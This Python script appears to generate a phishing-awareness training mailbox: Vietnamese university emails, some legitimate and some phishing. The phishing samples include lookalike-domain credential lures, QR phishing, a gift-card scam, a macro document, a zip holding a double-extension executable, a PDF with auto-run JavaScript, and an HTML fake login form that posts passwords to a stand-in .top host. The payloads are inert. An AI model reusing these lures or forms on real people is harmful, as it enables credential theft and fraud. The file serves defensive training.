"""Builds the demo mailbox (samples/*.eml + samples/index.json).

All "malicious" artefacts are INERT stand-ins (no real payloads): the fake .exe is a few
bytes of text after an 'MZ' header, the macro is a dummy vbaProject.bin, the PDF JavaScript
only calls app.alert, the HTML form posts to a non-existent .top domain.
"""
import io
import json
import os
import zipfile
from email import policy
from email.message import EmailMessage
from email.utils import formatdate, make_msgid

FONT_PATHS = ["/usr/share/fonts/truetype/noto/NotoSans-Regular.ttf",
              "/usr/share/fonts/truetype/dejavu/DejaVuSans.ttf",
              "/Library/Fonts/Arial Unicode.ttf", "C:/Windows/Fonts/arial.ttf"]
BOLD_PATHS = ["/usr/share/fonts/truetype/noto/NotoSans-Bold.ttf",
              "/usr/share/fonts/truetype/dejavu/DejaVuSans-Bold.ttf", "C:/Windows/Fonts/arialbd.ttf"]


def _font(size, bold=False):
    from PIL import ImageFont
    for p in (BOLD_PATHS if bold else FONT_PATHS):
        if os.path.exists(p):
            return ImageFont.truetype(p, size)
    return ImageFont.load_default(size)


def _wrap(draw, text, font, width):
    lines, cur = [], ""
    for w in text.split():
        t = (cur + " " + w).strip()
        if draw.textlength(t, font=font) <= width:
            cur = t
        else:
            lines.append(cur)
            cur = w
    return lines + [cur]


def notice_image(title, lines, qr=None, accent=(0, 103, 184), size=(900, 760)):
    """Renders a 'notice' (poster / fake alert) as PNG, optionally with a QR code."""
    import qrcode
    from PIL import Image, ImageDraw
    img = Image.new("RGB", size, "white")
    d = ImageDraw.Draw(img)
    d.rectangle([0, 0, size[0], 90], fill=accent)
    d.text((40, 24), title, font=_font(34, True), fill="white")
    y = 130
    for para in lines:
        for ln in _wrap(d, para, _font(26), size[0] - 80):
            d.text((40, y), ln, font=_font(26), fill=(30, 30, 30))
            y += 38
        y += 14
    if qr:
        q = qrcode.make(qr, box_size=7, border=2).convert("RGB")
        img.paste(q, ((size[0] - q.size[0]) // 2, min(y + 10, size[1] - q.size[1] - 10)))
    buf = io.BytesIO()
    img.save(buf, "PNG")
    return buf.getvalue()


def image_pdf(title, lines):
    """Benign PDF (rendered page, no active content)."""
    from PIL import Image
    png = notice_image(title, lines, size=(1240, 900))
    buf = io.BytesIO()
    Image.open(io.BytesIO(png)).save(buf, "PDF")
    return buf.getvalue()


def text_pdf(lines, js=None, uri=None):
    """Minimal hand-written PDF with ASCII text, optional /OpenAction JavaScript and /URI link."""
    content = "BT /F1 16 Tf 60 760 Td 22 TL " + " ".join(f"({l}) '" for l in lines) + " ET"
    objs = ["<< /Type /Catalog /Pages 2 0 R" + (" /OpenAction 6 0 R" if js else "") + " >>",
            "<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            "<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R "
            "/Resources << /Font << /F1 5 0 R >> >>" + (" /Annots [7 0 R]" if uri else "") + " >>",
            f"<< /Length {len(content)} >>\nstream\n{content}\nendstream",
            "<< /Type /Font /Subtype /Type1 /BaseFont /Helvetica >>"]
    objs.append(f"<< /Type /Action /S /JavaScript /JS ({js}) >>" if js else "<< >>")
    if uri:
        objs.append(f"<< /Type /Annot /Subtype /Link /Rect [60 600 400 640] /Border [0 0 0] "
                    f"/A << /S /URI /URI ({uri}) >> >>")
    out, offs = b"%PDF-1.4\n", []
    for i, o in enumerate(objs, 1):
        offs.append(len(out))
        out += f"{i} 0 obj\n{o}\nendobj\n".encode("latin-1")
    xref = len(out)
    out += f"xref\n0 {len(objs) + 1}\n0000000000 65535 f \n".encode()
    out += "".join(f"{o:010d} 00000 n \n" for o in offs).encode()
    out += f"trailer\n<< /Size {len(objs) + 1} /Root 1 0 R >>\nstartxref\n{xref}\n%%EOF\n".encode()
    return out


def docm_with_macro(paragraphs):
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_DEFLATED) as z:
        z.writestr("[Content_Types].xml",
                   '<?xml version="1.0"?><Types xmlns="http://schemas.openxmlformats.org/package/'
                   '2006/content-types"><Override PartName="/word/document.xml" ContentType="'
                   'application/vnd.ms-word.document.macroEnabled.main+xml"/></Types>')
        z.writestr("_rels/.rels", '<?xml version="1.0"?><Relationships xmlns="http://schemas.'
                   'openxmlformats.org/package/2006/relationships"/>')
        body = "".join(f"<w:p><w:r><w:t>{p}</w:t></w:r></w:p>" for p in paragraphs)
        z.writestr("word/document.xml", '<?xml version="1.0"?><w:document xmlns:w="http://schemas'
                   '.openxmlformats.org/wordprocessingml/2006/main"><w:body>' + body +
                   "</w:body></w:document>")
        z.writestr("word/vbaProject.bin", b"INERT DEMO - not a real VBA project")
    return buf.getvalue()


def zip_locked(inner_name, inner_data):
    """ZIP whose entry is flagged as encrypted (flag bit 0) - enough to demo the check."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", zipfile.ZIP_STORED) as z:
        z.writestr(inner_name, inner_data)
    raw = bytearray(buf.getvalue())
    for sig, off in ((b"PK\x03\x04", 6), (b"PK\x01\x02", 8)):
        i = raw.find(sig)
        raw[i + off] |= 0x01
    return bytes(raw)


FAKE_LOGIN_HTML = """<!doctype html><html><head><meta charset="utf-8"><title>Biên lai học phí</title>
</head><body style="font-family:sans-serif">
<h2>Cổng thanh toán học phí - Trường Đại học Demo</h2>
<p>Phiên đăng nhập đã hết hạn. Vui lòng đăng nhập bằng email trường để xem biên lai.</p>
<form action="http://hocphi-dhdemo.billing-notice.top/collect.php" method="post">
Email: <input name="u"><br>Mật khẩu: <input type="password" name="p"><br>
<button>Xem biên lai</button></form>
<script>var d = atob("SU5FUlQgREVNTw=="); /* inert demo payload */</script>
</body></html>"""


def _msg(frm, to, subject, auth=None, reply_to=None, return_path=None):
    m = EmailMessage(policy=policy.default.clone(max_line_length=998))  # avoid folding bug
    m["From"], m["To"], m["Subject"] = frm, to, subject
    m["Date"] = formatdate(localtime=True)
    m["Message-ID"] = make_msgid(domain="mail.example")
    if reply_to:
        m["Reply-To"] = reply_to
    if return_path:
        m["Return-Path"] = return_path
    if auth:
        m["Authentication-Results"] = f"mx.dhdemo.edu.vn; {auth}"
    return m


PASS = "spf=pass; dkim=pass; dmarc=pass"
STUDENT = "Nguyễn Minh Anh <minhanh.sv@dhdemo.edu.vn>"


def build(out_dir="samples"):
    os.makedirs(out_dir, exist_ok=True)
    S = []

    def save(sid, m, title, truth, attack, lesson):
        with open(os.path.join(out_dir, f"{sid}.eml"), "wb") as f:
            f.write(bytes(m))
        S.append(dict(id=sid, title=title, truth=truth, attack=attack, lesson=lesson,
                      subject=str(m["Subject"]), sender=str(m["From"])))

    # 1 legit exam schedule + benign PDF
    m = _msg("Phòng Đào tạo <daotao@dhdemo.edu.vn>", STUDENT, "Lịch thi cuối kỳ học kỳ 1",
             PASS + " header.from=dhdemo.edu.vn")
    m.set_content("Thân gửi các bạn sinh viên,\n\nLịch thi cuối kỳ học kỳ 1 đã được cập nhật "
                  "trên cổng đào tạo: https://dhdemo.edu.vn/lich-thi\nCác bạn kiểm tra phòng thi và "
                  "mang theo thẻ sinh viên. Lịch chi tiết xem trong tệp đính kèm.\n\nTrân trọng,\n"
                  "Phòng Đào tạo")
    m.add_attachment(image_pdf("LỊCH THI CUỐI KỲ HK1", [
        "Môn Cấu trúc dữ liệu - 08/01 - 7h30 - phòng B2.03",
        "Môn Mạng máy tính - 10/01 - 9h30 - phòng A1",
        "Sinh viên có mặt trước giờ thi 15 phút."]),
        maintype="application", subtype="pdf", filename="Lich_thi_HK1.pdf")
    save("s01_lich_thi", m, "Lịch thi cuối kỳ (Phòng Đào tạo)", "legit", "legit",
         "Email thật: gửi từ tên miền của trường, xác thực SPF/DKIM/DMARC đạt, liên kết trỏ "
         "đúng dhdemo.edu.vn, tệp PDF không chứa mã.")

    # 2 classic credential phishing, lookalike domain + href mismatch
    m = _msg("Phòng CNTT <it-support@dhdemo-edu.com>", STUDENT,
             "[KHẨN] Tài khoản email sinh viên sẽ bị khóa",
             "spf=fail smtp.mailfrom=dhdemo-edu.com; dkim=none; dmarc=fail header.from=dhdemo-edu.com")
    m.set_content("Kính gửi sinh viên, tài khoản sẽ bị khóa trong 24 giờ.")
    m.add_alternative(
        "<p>Kính gửi sinh viên,</p><p>Hệ thống email sinh viên đang được nâng cấp. Tài khoản của "
        "bạn sẽ <b>bị khóa trong vòng 24 giờ</b> nếu không xác minh.</p><p>Vui lòng nhấn vào "
        "đường link sau để xác minh tài khoản ngay: <a href='http://dhdemo.edu.vn.account-verify"
        ".top/login'>https://dhdemo.edu.vn/xac-thuc</a></p><p>Phòng CNTT</p>", subtype="html")
    save("s02_khoa_tai_khoan", m, "Tài khoản email sẽ bị khóa", "phishing", "credential_harvest",
         "Tên miền dhdemo-edu.com giả dạng dhdemo.edu.vn; chữ hiển thị là link của trường nhưng "
         "thực tế dẫn tới .top; đe dọa khóa tài khoản + hạn 24 giờ.")

    # 3 LLM-polished, personalised scholarship lure from free-mail
    m = _msg("Phòng Công tác Sinh viên <phongctsv.dhdemo@gmail.com>", STUDENT,
             "Xác nhận thông tin nhận học bổng Khuyến khích học tập HK1",
             "spf=pass; dkim=pass; dmarc=pass header.from=gmail.com",
             reply_to="hocbong.ctsv@outlook.com")
    m.set_content(
        "Chào Minh Anh,\n\nHy vọng bạn có một tuần học tập hiệu quả. Như đã trao đổi trong buổi "
        "sinh hoạt lớp CNTT01, bạn nằm trong danh sách dự kiến nhận học bổng Khuyến khích học tập "
        "học kỳ 1 với mức 5.000.000 đồng.\n\nĐể nhà trường kịp chuyển học bổng trong đợt này, "
        "bạn vui lòng xác nhận lại thông tin tài khoản ngân hàng và số CCCD qua biểu mẫu: "
        "https://bit.ly/hb-dhdemo-hk1\n\nCảm ơn bạn đã luôn đồng hành cùng nhà trường.\n"
        "Thân mến,\nThS. Lê Thị Hoa - Phòng Công tác Sinh viên")
    save("s03_hoc_bong_llm", m, "Học bổng - email viết trau chuốt (kiểu LLM)", "phishing", "scam",
         "Không có từ ngữ 'khẩn cấp' nhưng: gửi từ Gmail dưới tên Phòng CTSV, Reply-To sang "
         "Outlook, link rút gọn, xin số tài khoản + CCCD. Đây là kiểu email LLM viết lại để qua "
         "mặt bộ lọc từ khóa.")

    # 4 image-only + QR (quishing)
    m = _msg("Microsoft 365 Security <no-reply@micros0ft-365.xyz>", STUDENT,
             "Thông báo bảo mật tài khoản", "spf=softfail; dkim=none; dmarc=none")
    m.set_content("Vui lòng xem thông báo bên dưới.")
    cid = make_msgid(domain="img.example")
    m.add_alternative(f'<p>Vui lòng xem thông báo bên dưới.</p><img src="cid:{cid[1:-1]}">',
                      subtype="html")
    png = notice_image("Microsoft 365 - Xác thực bắt buộc", [
        "Tài khoản email trường của bạn chưa kích hoạt xác thực hai lớp mới.",
        "Quét mã QR bằng điện thoại để xác minh trước 17h hôm nay, quá hạn tài khoản sẽ bị tạm khóa."],
        qr="http://m365-dhdemo.verify-login.click/auth?u=minhanh", accent=(0, 120, 212))
    m.get_payload()[1].add_related(png, "image", "png", cid=cid, filename="thongbao.png")
    save("s04_qr_m365", m, "Email chỉ có ảnh + mã QR", "phishing", "quishing",
         "Thông điệp nằm trong ảnh (né bộ lọc văn bản) và liên kết nằm trong mã QR (né bộ lọc URL, "
         "bị quét bằng điện thoại cá nhân).")

    # 5 HTML attachment with fake login form
    m = _msg("Phòng Kế hoạch Tài chính <ketoan@dhdemo.edu.vn.billing-notice.top>", STUDENT,
             "Biên lai học phí học kỳ 1", "spf=none; dkim=none; dmarc=none")
    m.set_content("Chào bạn,\n\nNhà trường gửi biên lai học phí học kỳ 1 trong tệp đính kèm. "
                  "Vui lòng mở tệp để kiểm tra.\n\nPhòng KH-TC")
    m.add_attachment(FAKE_LOGIN_HTML.encode(), maintype="text", subtype="html",
                     filename="BienLai_HocPhi_HK1.html")
    save("s05_bien_lai_html", m, "Biên lai học phí (tệp HTML)", "phishing", "credential_harvest",
         "Tệp .html là một trang đăng nhập giả chạy ngay trên máy bạn, gửi mật khẩu tới máy chủ "
         "lạ; tên miền người gửi chỉ 'bắt đầu bằng' dhdemo.edu.vn.")

    # 6 macro document
    m = _msg("Văn phòng Khoa CNTT <vpk.cntt.dhdemo@yahoo.com>", STUDENT,
             "Danh sách sinh viên bị cảnh cáo học vụ", "spf=pass; dkim=pass; dmarc=pass header.from=yahoo.com")
    m.set_content("Danh sách sinh viên bị cảnh cáo học vụ học kỳ này được đính kèm. Vui lòng mở "
                  "tệp và bật Enable Content để xem đầy đủ nội dung. Sinh viên có tên cần phản hồi "
                  "trước thứ Sáu.")
    m.add_attachment(docm_with_macro(["DANH SÁCH SINH VIÊN BỊ CẢNH CÁO HỌC VỤ",
                                      "Nội dung bị ẩn. Bấm Enable Content để hiển thị."]),
                     maintype="application", subtype="vnd.ms-word.document.macroEnabled.12",
                     filename="DanhSach_CanhCao_HocVu.docm")
    save("s06_macro_docm", m, "Danh sách cảnh cáo (tệp Word có macro)", "phishing", "malware",
         "Tài liệu .docm chứa macro và yêu cầu 'Enable Content' - cách phổ biến nhất để chạy mã "
         "độc qua tài liệu Office.")

    # 7 password-protected zip with double extension
    m = _msg("Hóa đơn điện tử <hoadon@einvoice-vn.top>", STUDENT, "Hóa đơn điện tử tháng 10",
             "spf=none; dkim=none; dmarc=none")
    m.set_content("Hóa đơn điện tử tháng 10 của bạn đã được phát hành. Giải nén tệp đính kèm bằng "
                  "mật khẩu 2468 để xem hóa đơn.")
    m.add_attachment(zip_locked("HoaDon_T10.pdf.exe", b"MZ" + b"\x00" * 62 + b"INERT DEMO FILE"),
                     maintype="application", subtype="zip", filename="HoaDon_T10.zip")
    save("s07_zip_exe", m, "Hóa đơn điện tử (zip có mật khẩu)", "phishing", "malware",
         "Tệp nén có mật khẩu để phần mềm diệt virus không quét được; bên trong là tệp .pdf.exe "
         "đuôi kép.")

    # 8 BEC gift-card
    m = _msg("PGS.TS Nguyễn Văn An - Trưởng khoa <nguyenvanan.khoacntt@gmail.com>", STUDENT,
             "Nhờ em việc gấp")
    m.set_content("Em Minh Anh ơi,\n\nThầy đang họp không nghe máy được. Em mua giúp thầy 5 thẻ "
                  "cào Viettel mệnh giá 500.000 rồi gửi mã thẻ qua email này nhé, chiều thầy gửi "
                  "lại tiền. Việc này em giữ kín giúp thầy.\n\nThầy An")
    save("s08_the_cao", m, "Thầy nhờ mua thẻ cào", "phishing", "payment_fraud",
         "Không có liên kết hay tệp - bộ lọc kỹ thuật bỏ qua. Dấu hiệu nằm ở nội dung: mạo danh "
         "người có thẩm quyền, gấp, giữ bí mật, đòi mã thẻ cào, gửi từ Gmail.")

    # 9 legit club event with poster + QR to official site
    m = _msg("CLB Tin học <clbtinhoc@dhdemo.edu.vn>", STUDENT, "Mời tham gia workshop Nhập môn AI",
             PASS + " header.from=dhdemo.edu.vn")
    m.set_content("Chào các bạn,\n\nCLB Tin học mời các bạn tham gia workshop \"Nhập môn AI\" vào "
                  "thứ Năm lúc 14h00 tại hội trường A1. Thông tin chi tiết trong poster và trên "
                  "trang sự kiện: https://dhdemo.edu.vn/su-kien/nhap-mon-ai\n\nBan chủ nhiệm CLB")
    m.add_attachment(notice_image("WORKSHOP NHẬP MÔN AI", [
        "Thứ Năm, 14h00 - Hội trường A1", "Diễn giả: TS. Phạm Minh Tuấn",
        "Đăng ký tại trang sự kiện của trường"],
        qr="https://dhdemo.edu.vn/su-kien/nhap-mon-ai", accent=(27, 140, 90)),
        maintype="image", subtype="png", filename="poster_workshop.png")
    save("s09_su_kien_clb", m, "Workshop CLB Tin học (poster + QR)", "legit", "legit",
         "Email thật có ảnh và QR: QR dẫn về đúng tên miền của trường, người gửi xác thực đạt.")

    # 10 spoofed own domain + PDF with JavaScript and link
    m = _msg("Phòng Đào tạo <daotao@dhdemo.edu.vn>", STUDENT, "Thông báo điều chỉnh học phí",
             "spf=fail smtp.mailfrom=mailer.cheap-smtp.ru; dkim=none; dmarc=fail header.from=dhdemo.edu.vn",
             return_path="bounce@cheap-smtp.ru")
    m.set_content("Nhà trường thông báo điều chỉnh mức học phí học kỳ 2. Chi tiết trong tệp đính "
                  "kèm.")
    m.add_attachment(text_pdf(["THONG BAO DIEU CHINH HOC PHI", "Bam vao day de xem chi tiet"],
                              js="app.alert('INERT DEMO');",
                              uri="http://hocphi-dhdemo.billing-notice.top/xem"),
                     maintype="application", subtype="pdf", filename="ThongBao_DieuChinh_HocPhi.pdf")
    save("s10_pdf_js", m, "Điều chỉnh học phí (giả mạo chính tên miền trường)", "phishing",
         "malware", "Địa chỉ người gửi trông đúng là của trường nhưng SPF/DMARC thất bại (bị giả "
         "mạo); PDF tự chạy JavaScript khi mở và chứa link tới tên miền lạ.")

    # 11 English, LLM-style
    m = _msg("IT Service Desk <it-desk@dhdemo-edu.com>", STUDENT,
             "Action required: your Microsoft 365 password expires today",
             "spf=fail; dkim=none; dmarc=fail")
    m.set_content("Hi Minh Anh,")
    m.add_alternative(
        "<p>Hi Minh Anh,</p><p>Hope your semester is going well. As part of the annual security "
        "review, your Microsoft 365 password expires today. To keep your current password and avoid "
        "interruption to your coursework, please confirm your sign-in details below.</p><p>"
        "<a href='https://login.microsoftonline.com.secure-auth.xyz/common'>"
        "https://login.microsoftonline.com</a></p><p>Thank you,<br>IT Service Desk</p>",
        subtype="html")
    save("s11_en_m365", m, "Microsoft 365 password expires (English)", "phishing",
         "credential_harvest", "Giọng văn lịch sự, cá nhân hóa (kiểu LLM). Link hiển thị "
         "microsoftonline.com nhưng tên miền thật là secure-auth.xyz.")

    # 12 legit maintenance notice that mentions passwords
    m = _msg("Phòng CNTT <it@dhdemo.edu.vn>", STUDENT, "Bảo trì hệ thống email",
             PASS + " header.from=dhdemo.edu.vn")
    m.set_content("Phòng CNTT thông báo hệ thống email sẽ bảo trì từ 22h đến 23h thứ Bảy, có thể "
                  "gián đoạn gửi nhận thư.\n\nLưu ý: Nhà trường không bao giờ yêu cầu bạn cung cấp "
                  "mật khẩu qua email. Nếu nhận được email như vậy, hãy báo cho it@dhdemo.edu.vn.")
    save("s12_bao_tri", m, "Bảo trì hệ thống email (có nhắc 'mật khẩu')", "legit", "legit",
         "Email thật dù có từ 'mật khẩu': người gửi xác thực, không có liên kết, còn nhắc nhở an "
         "toàn.")

    with open(os.path.join(out_dir, "index.json"), "w", encoding="utf-8") as f:
        json.dump(S, f, ensure_ascii=False, indent=1)
    return S
